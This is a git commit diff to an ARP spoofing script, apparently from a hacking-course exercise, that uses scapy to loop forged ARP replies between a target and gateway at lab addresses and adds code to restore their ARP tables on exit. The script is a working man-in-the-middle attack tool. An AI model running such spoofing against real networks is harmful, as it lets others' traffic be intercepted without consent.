fa7ae333434e09cb0eaa576be536cf9cab347428
Lazaro Castro (Lazin) <lazarocastro@gmail.com>
2018-09-14 13:53:10 -0300

    Restoring ARP Tables When an Exception Occures

--- 3-ARP_Spoofer/arp_spoof.py
+++ 3-ARP_Spoofer/arp_spoof.py
@@ -23,18 +23,23 @@ def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
+    scapy.send(packet, count=4, verbose=False)
 
-sent_packets_count = 0
+target_ip = "10.0.2.7"
+gateway_ip = "10.0.2.1"
+
 try:
+    packets_sent_count = 0
     while True:
-        spoof("10.0.2.7", "10.0.2.1")
-        spoof("10.0.2.1", "10.0.2.7")
-        sent_packets_count += 2
-        print("\r[+] Sent packets: " + str(sent_packets_count)),
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        packets_sent_count += 2
+        print("\r[+] Sent packets: " + str(packets_sent_count)),
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[+] Detected CTRL + C ..... Quitting.\n")
+    print("\n[-] Detected CTRL + C ... Resetting ARP tables... Please wait.\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
 
 
